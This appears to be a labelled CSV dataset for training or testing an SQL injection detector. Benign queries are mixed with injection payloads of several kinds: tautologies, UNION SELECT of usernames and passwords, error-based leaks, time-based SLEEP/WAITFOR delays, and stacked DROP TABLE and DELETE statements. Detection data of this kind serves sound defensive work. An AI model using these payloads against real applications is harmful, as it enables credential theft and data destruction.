query_text,label,category
SELECT * FROM test_customers ORDER BY name DESC LIMIT 10,0,benign
admin'--,1,comment_bypass
SELECT * FROM test_orders WHERE name = 'admin'--' AND password = 'widget',1,comment_bypass
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT * FROM test_orders WHERE amount > 345 AND amount < 3739,0,benign
"SELECT * FROM orders WHERE id = 364 UNION SELECT username, password FROM users--",1,union_based
SELECT * FROM test_customers WHERE id = 833 AND SLEEP(5),1,blind_time_based
SELECT * FROM customers WHERE amount > 597 AND amount < 2641,0,benign
SELECT COUNT(*) FROM sessions WHERE status IS NOT NULL,0,benign
DELETE FROM test_customers WHERE id = 158,0,benign
SELECT * FROM sessions WHERE name LIKE '%john%',0,benign
SELECT * FROM test_transactions WHERE name LIKE '%gadget%',0,benign
admin' OR '1'='1'--,1,tautology
SELECT COUNT(*) FROM orders WHERE id IS NOT NULL,0,benign
"' UNION SELECT NULL, NULL, NULL--",1,union_based
UPDATE sessions SET id = 'test' WHERE id = 389,0,benign
SELECT * FROM sessions WHERE id = 678,0,benign
SELECT * FROM orders WHERE name LIKE '%jane%',0,benign
"SELECT * FROM test_orders WHERE id = 947 UNION SELECT username, password FROM users--",1,union_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
'; INSERT INTO test_transactions VALUES ('hacked');--,1,stacked_queries
SELECT * FROM orders WHERE name = 'admin'--' AND password = 'jane',1,comment_bypass
SELECT * FROM customers ORDER BY email DESC LIMIT 10,0,benign
' OR ''=',1,comment_bypass
test; DROP TABLE orders;--,1,stacked_queries
SELECT * FROM orders WHERE amount > 309 AND amount < 2099,0,benign
UPDATE test_customers SET email = 'widget' WHERE id = 689,0,benign
SELECT * FROM test_transactions ORDER BY name DESC LIMIT 10,0,benign
' OR 1=1#,1,tautology
SELECT * FROM test_customers ORDER BY id DESC LIMIT 10,0,benign
SELECT * FROM sessions WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM orders ORDER BY id DESC LIMIT 10,0,benign
SELECT * FROM test_orders WHERE amount > 89 AND amount < 2641,0,benign
SELECT * FROM test_customers WHERE amount > 396 AND amount < 1334,0,benign
' OR 1=1#,1,tautology
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
UPDATE test_customers SET amount = 'smith' WHERE id = 981,0,benign
SELECT * FROM sessions ORDER BY status DESC LIMIT 10,0,benign
SELECT COUNT(*) FROM test_orders WHERE amount IS NOT NULL,0,benign
"SELECT * FROM sessions WHERE id = 620 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
UPDATE test_transactions SET email = 'smith' WHERE id = 739,0,benign
DELETE FROM test_customers WHERE id = 851,0,benign
"SELECT * FROM orders WHERE id = 718 UNION SELECT username, password FROM users--",1,union_based
1; DELETE FROM test_customers;--,1,stacked_queries
' OR ''=',1,comment_bypass
admin' OR '1'='1'--,1,tautology
SELECT * FROM test_customers WHERE id = 476 OR 'a'='a',1,tautology
SELECT * FROM orders WHERE id = 278,0,benign
SELECT * FROM sessions WHERE status = 'active' OR status = 'pending',0,benign
"SELECT * FROM sessions WHERE id = 140 UNION SELECT username, password FROM users--",1,union_based
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM test_orders WHERE amount > 984 AND amount < 2483,0,benign
SELECT * FROM customers WHERE name = '' OR 1=1--,1,tautology
SELECT * FROM test_customers WHERE id = 96 AND SLEEP(5),1,blind_time_based
test; DROP TABLE orders;--,1,stacked_queries
DELETE FROM customers WHERE id = 520,0,benign
SELECT COUNT(*) FROM test_transactions WHERE name IS NOT NULL,0,benign
SELECT * FROM orders WHERE id = 268 AND SLEEP(5),1,blind_time_based
SELECT amount FROM sessions WHERE amount = 'widget',0,benign
SELECT status FROM test_orders WHERE status = 'john',0,benign
UPDATE test_transactions SET email = 'smith' WHERE id = 157,0,benign
admin'#,1,comment_bypass
1; DELETE FROM test_orders;--,1,stacked_queries
SELECT * FROM customers WHERE name LIKE '%widget%',0,benign
admin'#,1,comment_bypass
SELECT * FROM test_customers WHERE amount > 465 AND amount < 3070,0,benign
1; DELETE FROM customers;--,1,stacked_queries
DELETE FROM orders WHERE id = 135,0,benign
SELECT * FROM test_transactions WHERE name = 'admin'--' AND password = 'test',1,comment_bypass
DELETE FROM test_customers WHERE id = 905,0,benign
SELECT COUNT(*) FROM test_customers WHERE email IS NOT NULL,0,benign
SELECT * FROM customers WHERE id = 119,0,benign
SELECT * FROM test_orders WHERE id = 330,0,benign
admin' OR '1'='1'--,1,tautology
SELECT COUNT(*) FROM sessions WHERE id IS NOT NULL,0,benign
DELETE FROM sessions WHERE id = 448,0,benign
"' UNION SELECT NULL, NULL, NULL--",1,union_based
SELECT * FROM test_transactions ORDER BY amount DESC LIMIT 10,0,benign
SELECT * FROM test_transactions WHERE name LIKE '%smith%',0,benign
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
' UNION SELECT @@version--,1,union_based
DELETE FROM test_customers WHERE id = 883,0,benign
SELECT item FROM test_orders WHERE item = 'widget',0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM orders WHERE id = 450,0,benign
"SELECT * FROM test_customers WHERE id = 329 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
'; INSERT INTO orders VALUES ('hacked');--,1,stacked_queries
UPDATE orders SET id = 'acme' WHERE id = 135,0,benign
DELETE FROM customers WHERE id = 236,0,benign
SELECT * FROM test_customers WHERE status = 'active' OR status = 'pending',0,benign
' UNION SELECT @@version--,1,union_based
test; DROP TABLE test_customers;--,1,stacked_queries
SELECT * FROM customers WHERE name LIKE '%jane%',0,benign
SELECT COUNT(*) FROM test_transactions WHERE name IS NOT NULL,0,benign
SELECT * FROM orders WHERE name LIKE '%gadget%',0,benign
INSERT INTO test_customers (amount) VALUES ('smith'),0,benign
INSERT INTO sessions (email) VALUES ('gadget'),0,benign
SELECT COUNT(*) FROM customers WHERE amount IS NOT NULL,0,benign
SELECT * FROM orders WHERE amount > 88 AND amount < 4162,0,benign
SELECT * FROM test_orders WHERE id = 883 OR '1'='1',1,tautology
admin'#,1,comment_bypass
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
'; INSERT INTO test_customers VALUES ('hacked');--,1,stacked_queries
SELECT * FROM sessions WHERE name LIKE '%smith%',0,benign
"' UNION SELECT NULL, NULL, NULL--",1,union_based
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
SELECT * FROM orders WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM sessions WHERE id = 466,0,benign
SELECT * FROM orders WHERE name LIKE '%ltd%',0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
1; DELETE FROM test_transactions;--,1,stacked_queries
admin'--,1,comment_bypass
SELECT * FROM customers WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM test_transactions WHERE amount > 272 AND amount < 1571,0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM customers WHERE name = 'admin'--' AND password = 'john',1,comment_bypass
UPDATE test_transactions SET id = 'widget' WHERE id = 688,0,benign
SELECT * FROM test_transactions WHERE id = 168 OR '1'='1',1,tautology
'; INSERT INTO customers VALUES ('hacked');--,1,stacked_queries
' OR ''=',1,comment_bypass
admin' OR '1'='1'--,1,tautology
SELECT * FROM test_customers WHERE id = 997 AND SLEEP(5),1,blind_time_based
' OR '1'='1,1,tautology
SELECT * FROM sessions WHERE name LIKE '%smith%',0,benign
SELECT COUNT(*) FROM test_transactions WHERE item IS NOT NULL,0,benign
SELECT * FROM test_customers ORDER BY id DESC LIMIT 10,0,benign
'; INSERT INTO test_orders VALUES ('hacked');--,1,stacked_queries
SELECT * FROM test_orders WHERE id = 318 OR 'a'='a',1,tautology
UPDATE test_transactions SET id = 'jane' WHERE id = 261,0,benign
SELECT * FROM sessions ORDER BY amount DESC LIMIT 10,0,benign
UPDATE customers SET name = 'corp' WHERE id = 720,0,benign
' OR '1'='1,1,tautology
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
admin'--,1,comment_bypass
SELECT * FROM test_orders WHERE amount > 508 AND amount < 4951,0,benign
SELECT * FROM test_orders WHERE id = 180,0,benign
SELECT * FROM test_customers WHERE id = 674,0,benign
SELECT * FROM test_customers WHERE id = 381 AND SLEEP(5),1,blind_time_based
SELECT email FROM sessions WHERE email = 'gadget',0,benign
SELECT * FROM test_orders WHERE name LIKE '%ltd%',0,benign
"SELECT * FROM customers WHERE id = 861 UNION SELECT username, password FROM users--",1,union_based
SELECT COUNT(*) FROM test_transactions WHERE status IS NOT NULL,0,benign
INSERT INTO orders (item) VALUES ('corp'),0,benign
1; DELETE FROM test_orders;--,1,stacked_queries
UPDATE test_transactions SET id = 'acme' WHERE id = 96,0,benign
SELECT * FROM customers WHERE name LIKE '%widget%',0,benign
SELECT COUNT(*) FROM orders WHERE email IS NOT NULL,0,benign
SELECT * FROM test_orders WHERE name LIKE '%test%',0,benign
SELECT * FROM sessions WHERE id = 537 OR '1'='1',1,tautology
DELETE FROM test_orders WHERE id = 885,0,benign
1; DELETE FROM customers;--,1,stacked_queries
1; DELETE FROM test_transactions;--,1,stacked_queries
SELECT * FROM test_transactions WHERE id = 969 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
UPDATE orders SET email = 'ltd' WHERE id = 225,0,benign
"SELECT status FROM test_orders WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
SELECT * FROM orders WHERE amount > 977 AND amount < 3957,0,benign
INSERT INTO orders (item) VALUES ('widget'),0,benign
SELECT status FROM orders WHERE status = 'john',0,benign
UPDATE test_orders SET name = 'test' WHERE id = 485,0,benign
SELECT * FROM test_orders ORDER BY item DESC LIMIT 10,0,benign
SELECT * FROM sessions WHERE id = 621 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
SELECT * FROM customers WHERE status = 'active' OR status = 'pending',0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
"' UNION SELECT NULL, NULL, NULL--",1,union_based
DELETE FROM orders WHERE id = 528,0,benign
DELETE FROM test_transactions WHERE id = 62,0,benign
SELECT * FROM customers WHERE amount > 704 AND amount < 3946,0,benign
'; INSERT INTO sessions VALUES ('hacked');--,1,stacked_queries
UPDATE test_transactions SET item = 'smith' WHERE id = 342,0,benign
1; DELETE FROM test_transactions;--,1,stacked_queries
' UNION SELECT @@version--,1,union_based
SELECT * FROM orders WHERE name LIKE '%gadget%',0,benign
"SELECT * FROM test_orders WHERE id = 629 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM orders ORDER BY amount DESC LIMIT 10,0,benign
"SELECT * FROM test_orders WHERE id = 243 UNION SELECT username, password FROM users--",1,union_based
admin' OR '1'='1'--,1,tautology
SELECT * FROM customers WHERE id = 312,0,benign
"SELECT * FROM orders WHERE id = 94 UNION SELECT username, password FROM users--",1,union_based
"' UNION SELECT NULL, NULL, NULL--",1,union_based
SELECT * FROM sessions WHERE name = 'admin'--' AND password = 'acme',1,comment_bypass
admin'--,1,comment_bypass
SELECT * FROM customers WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM customers ORDER BY amount DESC LIMIT 10,0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM test_transactions WHERE name = 'admin'--' AND password = 'jane',1,comment_bypass
SELECT * FROM sessions WHERE name LIKE '%widget%',0,benign
SELECT * FROM sessions ORDER BY name DESC LIMIT 10,0,benign
SELECT * FROM test_customers WHERE amount > 419 AND amount < 1611,0,benign
SELECT * FROM test_transactions WHERE name LIKE '%test%',0,benign
SELECT * FROM test_orders WHERE status = 'active' OR status = 'pending',0,benign
' OR ''=',1,comment_bypass
"SELECT * FROM customers WHERE id = 661 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM customers ORDER BY item DESC LIMIT 10,0,benign
'; INSERT INTO test_orders VALUES ('hacked');--,1,stacked_queries
"SELECT * FROM customers WHERE id = 753 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT amount FROM sessions WHERE amount = 'ltd',0,benign
"SELECT * FROM sessions WHERE id = 22 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
admin'#,1,comment_bypass
SELECT COUNT(*) FROM orders WHERE status IS NOT NULL,0,benign
UPDATE orders SET email = 'smith' WHERE id = 581,0,benign
admin'--,1,comment_bypass
SELECT * FROM test_transactions WHERE status = 'active' OR status = 'pending',0,benign
jane; DROP TABLE orders;--,1,stacked_queries
SELECT name FROM orders WHERE name = 'gadget',0,benign
SELECT * FROM orders WHERE id = 278 OR 'a'='a',1,tautology
DELETE FROM orders WHERE id = 601,0,benign
SELECT * FROM test_customers WHERE name LIKE '%ltd%',0,benign
admin'--,1,comment_bypass
DELETE FROM sessions WHERE id = 834,0,benign
' OR ''=',1,comment_bypass
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
DELETE FROM test_transactions WHERE id = 338,0,benign
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
1; DELETE FROM customers;--,1,stacked_queries
SELECT * FROM test_transactions WHERE name = 'admin'--' AND password = 'test',1,comment_bypass
SELECT * FROM test_customers ORDER BY id DESC LIMIT 10,0,benign
SELECT COUNT(*) FROM test_customers WHERE name IS NOT NULL,0,benign
SELECT * FROM test_orders WHERE id = 960,0,benign
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
SELECT * FROM test_customers WHERE id = 550 OR '1'='1',1,tautology
SELECT amount FROM sessions WHERE amount = 'john',0,benign
"SELECT * FROM sessions WHERE id = 369 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
' OR '1'='1,1,tautology
SELECT * FROM sessions ORDER BY item DESC LIMIT 10,0,benign
SELECT * FROM customers WHERE id = 694 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
' OR '1'='1,1,tautology
SELECT COUNT(*) FROM test_orders WHERE email IS NOT NULL,0,benign
' UNION SELECT @@version--,1,union_based
SELECT status FROM orders WHERE status = 'gadget',0,benign
SELECT * FROM sessions ORDER BY name DESC LIMIT 10,0,benign
SELECT * FROM orders ORDER BY item DESC LIMIT 10,0,benign
' OR ''=',1,comment_bypass
' OR ''=',1,comment_bypass
"SELECT * FROM customers WHERE id = 847 UNION SELECT username, password FROM users--",1,union_based
admin' OR '1'='1'--,1,tautology
DELETE FROM test_customers WHERE id = 155,0,benign
SELECT * FROM test_transactions WHERE status = 'active' OR status = 'pending',0,benign
"SELECT amount FROM test_customers WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
SELECT COUNT(*) FROM customers WHERE id IS NOT NULL,0,benign
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
UPDATE test_customers SET status = 'corp' WHERE id = 426,0,benign
acme; DROP TABLE test_customers;--,1,stacked_queries
DELETE FROM test_customers WHERE id = 851,0,benign
1; DELETE FROM test_customers;--,1,stacked_queries
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
UPDATE customers SET status = 'test' WHERE id = 130,0,benign
SELECT COUNT(*) FROM orders WHERE status IS NOT NULL,0,benign
admin'#,1,comment_bypass
SELECT COUNT(*) FROM test_orders WHERE amount IS NOT NULL,0,benign
"SELECT * FROM test_orders WHERE id = 918 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
UPDATE test_customers SET item = 'acme' WHERE id = 515,0,benign
SELECT * FROM test_transactions WHERE id = 47,0,benign
DELETE FROM orders WHERE id = 424,0,benign
"SELECT status FROM test_transactions WHERE id = -1 UNION SELECT table_name, NULL FROM information_schema.tables--",1,union_based
DELETE FROM customers WHERE id = 803,0,benign
SELECT * FROM orders WHERE status = 'active' OR status = 'pending',0,benign
SELECT email FROM sessions WHERE email = 'jane',0,benign
"SELECT * FROM customers WHERE id = 141 UNION SELECT username, password FROM users--",1,union_based
1; DELETE FROM test_customers;--,1,stacked_queries
SELECT * FROM test_customers WHERE status = 'active' OR status = 'pending',0,benign
SELECT * FROM test_customers WHERE id = 231,0,benign
SELECT status FROM test_customers WHERE status = 'jane',0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,1,blind_time_based
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM sessions WHERE amount > 607 AND amount < 3234,0,benign
SELECT * FROM test_customers WHERE name LIKE '%smith%',0,benign
' OR '1'='1,1,tautology
SELECT * FROM sessions ORDER BY amount DESC LIMIT 10,0,benign
SELECT item FROM sessions WHERE item = 'john',0,benign
' OR 1=1#,1,tautology
UPDATE test_transactions SET status = 'widget' WHERE id = 624,0,benign
SELECT * FROM sessions WHERE id = 976 OR 'a'='a',1,tautology
SELECT COUNT(*) FROM test_customers WHERE email IS NOT NULL,0,benign
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
UPDATE orders SET id = 'smith' WHERE id = 900,0,benign
SELECT * FROM customers ORDER BY amount DESC LIMIT 10,0,benign
SELECT * FROM sessions WHERE status = 'active' OR status = 'pending',0,benign
SELECT status FROM customers WHERE status = 'corp',0,benign
' OR ''=',1,comment_bypass
1; DELETE FROM test_orders;--,1,stacked_queries
acme; DROP TABLE test_customers;--,1,stacked_queries
"' UNION SELECT NULL, NULL, NULL--",1,union_based
INSERT INTO customers (status) VALUES ('gadget'),0,benign
"' AND extractvalue(1, concat(0x7e, (SELECT version())))--",1,error_based
' UNION SELECT @@version--,1,union_based
UPDATE sessions SET status = 'smith' WHERE id = 707,0,benign
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
"' AND 1=CONVERT(int, (SELECT @@version))--",1,error_based
SELECT * FROM sessions WHERE name LIKE '%ltd%',0,benign
' OR 1=1#,1,tautology
admin'#,1,comment_bypass
admin'#,1,comment_bypass
' UNION SELECT @@version--,1,union_based
SELECT * FROM customers WHERE id = 41 OR '1'='1',1,tautology
"SELECT * FROM test_orders WHERE id = 539 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM test_orders WHERE name = '' OR 1=1--,1,tautology
' UNION SELECT @@version--,1,union_based
1; DELETE FROM test_customers;--,1,stacked_queries
SELECT * FROM sessions WHERE id = 435 AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(3),1,blind_time_based
SELECT * FROM orders WHERE status = 'active' OR status = 'pending',0,benign
' OR 1=1#,1,tautology
'; WAITFOR DELAY '0:0:5'--,1,blind_time_based
SELECT * FROM test_customers WHERE name = 'admin'--' AND password = 'acme',1,comment_bypass
"SELECT * FROM orders WHERE id = 859 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM sessions WHERE amount > 976 AND amount < 1127,0,benign
SELECT * FROM customers WHERE id = 221,0,benign
SELECT name FROM test_orders WHERE name = 'corp',0,benign
admin'#,1,comment_bypass
'; INSERT INTO orders VALUES ('hacked');--,1,stacked_queries
"' UNION SELECT NULL, NULL, NULL--",1,union_based
"SELECT * FROM test_customers WHERE id = 905 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
SELECT * FROM orders WHERE status = 'active' OR status = 'pending',0,benign
' OR ''=',1,comment_bypass
"SELECT * FROM orders WHERE id = 292 AND updatexml(1, concat(0x7e, database()), 1)--",1,error_based
